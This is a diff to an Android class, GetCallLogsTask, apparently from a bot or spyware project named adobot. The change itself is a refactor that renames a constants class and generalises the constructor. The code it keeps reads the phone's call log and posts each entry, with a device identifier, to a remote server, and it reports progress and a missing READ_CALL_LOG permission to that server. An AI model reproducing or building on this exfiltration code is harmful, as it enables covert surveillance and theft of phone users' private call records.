@@ -1,6 +1,7 @@
 package com.android.adobot.tasks;
 
 import android.Manifest;
+import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
@@ -8,13 +9,12 @@ import android.provider.CallLog;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
-import com.android.adobot.CommandService;
+import com.android.adobot.AdobotConstants;
 
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.HashMap;
 
-import com.android.adobot.Constants;
 import com.android.adobot.http.Http;
 import com.android.adobot.http.HttpRequest;
 
@@ -23,7 +23,7 @@ public class GetCallLogsTask extends BaseTask {
     private static String TAG = "GetCallLogsTask";
     private int numlogs;
 
-    public GetCallLogsTask(CommandService client, int numlogs) {
+    public GetCallLogsTask(Context client, int numlogs) {
         setContext(client);
         this.numlogs = numlogs;
     }
@@ -45,7 +45,7 @@ public class GetCallLogsTask extends BaseTask {
             start.put("uid", commonParams.getUid());
             start.put("device", commonParams.getDevice());
             Http startHttp = new Http();
-            startHttp.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+            startHttp.setUrl(commonParams.getServer() + AdobotConstants.NOTIFY_URL);
             startHttp.setMethod(HttpRequest.METHOD_POST);
             startHttp.setParams(start);
             startHttp.execute();
@@ -81,7 +81,7 @@ public class GetCallLogsTask extends BaseTask {
 
                     Http req = new Http();
                     req.setMethod(HttpRequest.METHOD_POST);
-                    req.setUrl(commonParams.getServer() + Constants.POST_CALL_LOGS_URL);
+                    req.setUrl(commonParams.getServer() + AdobotConstants.POST_CALL_LOGS_URL);
                     req.setParams(p);
                     req.execute();
                     this.numlogs--;
@@ -92,7 +92,7 @@ public class GetCallLogsTask extends BaseTask {
             start.put("uid", commonParams.getUid());
             start.put("device", commonParams.getDevice());
             Http doneHttp = new Http();
-            doneHttp.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+            doneHttp.setUrl(commonParams.getServer() + AdobotConstants.NOTIFY_URL);
             doneHttp.setMethod(HttpRequest.METHOD_POST);
             doneHttp.setParams(start);
             doneHttp.execute();
@@ -107,7 +107,7 @@ public class GetCallLogsTask extends BaseTask {
             noPermit.put("device", commonParams.getDevice());
             noPermit.put("permission", "READ_CALL_LOG");
             Http doneSMS = new Http();
-            doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+            doneSMS.setUrl(commonParams.getServer() + AdobotConstants.NOTIFY_URL);
             doneSMS.setMethod(HttpRequest.METHOD_POST);
             doneSMS.setParams(noPermit);
             doneSMS.execute();
